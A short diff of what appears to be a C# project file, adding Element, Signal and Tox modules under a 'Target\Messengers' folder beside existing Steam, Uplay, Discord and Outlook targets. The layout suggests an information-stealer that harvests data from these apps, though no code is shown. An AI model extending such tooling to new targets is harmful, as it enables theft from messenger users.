@@ -257,6 +257,9 @@
     <Compile Include="Target\Gaming\Steam.cs" />
     <Compile Include="Target\Gaming\Uplay.cs" />
     <Compile Include="Target\Messengers\Discord.cs" />
+    <Compile Include="Target\Messengers\Element.cs" />
+    <Compile Include="Target\Messengers\Signal.cs" />
+    <Compile Include="Target\Messengers\Tox.cs" />
     <Compile Include="Target\Messengers\Outlook.cs" />
     <Compile Include="Target\Messengers\Pidgin.cs" />
     <Compile Include="Target\Messengers\Icq.cs" />
